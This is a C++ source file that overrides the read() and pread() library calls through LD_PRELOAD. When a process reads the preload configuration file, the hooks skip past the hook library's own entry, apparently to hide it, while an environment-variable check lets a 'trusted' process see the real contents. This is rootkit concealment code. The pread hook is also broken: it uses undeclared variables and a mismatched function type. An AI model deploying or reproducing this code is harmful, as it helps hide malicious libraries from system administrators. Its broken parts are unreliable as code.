
#include "main.h"



ssize_t read (int fd, void *buf, size_t count) {
	CErrnoSaver serr;
	std::string lnkAim;
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	LSEEK lskPtr = (LSEEK)dlsym (RTLD_NEXT, "lseek");
	char *chPtr;
	ssize_t ret;
	

	assert (lskPtr != NULL);
	assert (rdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		if ((ret = rdPtr (fd, buf, count)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if (-1 == lskPtr (fd, SEEK_CUR, (hookLibraryName + separator).size ())) {
			serr.set (EBADF);
			return -1;
		}
	}
	
	
	if ((ret = rdPtr (fd, buf, count)) == -1) {
		serr.set (errno);
	}
	return ret;
}

ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
	CErrnoSaver serr;
	std::string lnkAim;
	READ prdPtr = (READ)dlsym (RTLD_NEXT, "pread");
	char *chPtr;
	

	assert (prdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if ((ret = rdPtr (fd, buf, count, offset + (hookLibraryName + separator).size ()))) {
			serr.set (errno);
			return ret;
		}
		return ret;
	}
	
	
	if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
		serr.set (errno);
	}
	return ret;
}








